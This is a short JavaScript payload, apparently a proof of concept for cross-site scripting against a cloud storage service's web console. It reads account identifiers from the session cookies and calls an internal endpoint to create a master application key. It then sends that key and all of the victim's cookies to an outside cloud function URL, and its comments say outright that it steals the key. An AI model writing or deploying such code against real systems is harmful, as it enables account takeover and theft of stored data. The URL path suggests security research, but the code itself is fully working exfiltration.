(function() {
  var SAVE_URL = "https://asia-southeast1-child-guard-prod.cloudfunctions.net/api/v1/poc/save";

  // Read accountId and clusterNum from cookies
  var accountId = "";
  var clusterNum = "";
  try {
    var sso = decodeURIComponent(document.cookie.match(/bz_sso=([^;]+)/)[1]);
    accountId = sso.match(/"accountId"\s*:\s*"([^"]+)"/)[1];
    clusterNum = document.cookie.match(/bz_cluster_num=([^;]+)/)[1];
  } catch(e) {}

  // Steal the MASTER KEY
  fetch("/account_tangle/create_b2_application_key", {
    method: "POST",
    credentials: "same-origin",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      accountId: accountId,
      clusterNum: clusterNum
    })
  })
  .then(function(r) { return r.json(); })
  .then(function(resp) {
    // Send master key to our server
    fetch(SAVE_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "MASTER_KEY_STOLEN",
        accountId: accountId,
        masterKey: resp.b2ApplicationKey,
        fullResponse: resp,
        cookies: document.cookie,
        timestamp: new Date().toISOString()
      })
    });
  });
})();
